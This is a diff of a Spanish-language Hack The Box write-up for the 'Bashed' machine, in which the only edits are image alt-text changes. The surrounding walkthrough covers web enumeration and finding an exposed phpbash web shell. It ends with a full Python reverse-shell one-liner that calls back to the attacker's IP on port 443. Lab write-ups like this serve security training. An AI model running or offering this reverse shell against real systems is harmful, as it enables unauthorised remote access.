@@ -90,11 +90,11 @@ http://10.10.10.68/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPS
 
 Por el momento no vemos nada interesante, así que ahora si vamos a ver el contenido vía web.
 
-![](/assets/images/htb-bashed/bashed-web.png)
+![""](/assets/images/htb-bashed/bashed-web.png)
 
 Analizando un poco el sitio web, vemos que cuenta con un recurso llamado `single.html` en el cual nos hablando de ***phpbash*** y nos dan la pista que se encuentra en el servidor.
 
-![](/assets/images/htb-bashed/bashed-web1.png)
+![""](/assets/images/htb-bashed/bashed-web1.png)
 
 Antes de tirar con herramientas tochas, vamos a tratar de descubrir rutas en el servidor mediante `nmap`:
 
@@ -119,13 +119,13 @@ Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
 
 Aqui ya vemos varios recursos que nos pueden llamadar la atención y empezaremos con `/dev/` y nos encontramos el proyecto del que nos hablan ***phpbash***:
 
-![](/assets/images/htb-bashed/bashed-web2.png)
+![""](/assets/images/htb-bashed/bashed-web2.png)
 
-![](/assets/images/htb-bashed/bashed-web3.png)
+![""](/assets/images/htb-bashed/bashed-web3.png)
 
 Vemos que podemos ejecutar comandos a nivel de sistema; tanto en `phpbash.min.php` como en `phpbash.php`. Podriamos pensar que con dicha herramienta ya tenemos ejecución de comandos y podemos entablarnos una reverse shell, y es correcto. Para este caso, validamos primero que cuente con python y posteriormente nos pusimos en escucha por el puerto 443 y mandamos una reverse shell.
 
-![](/assets/images/htb-bashed/bashed-web4.png)
+![""](/assets/images/htb-bashed/bashed-web4.png)
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
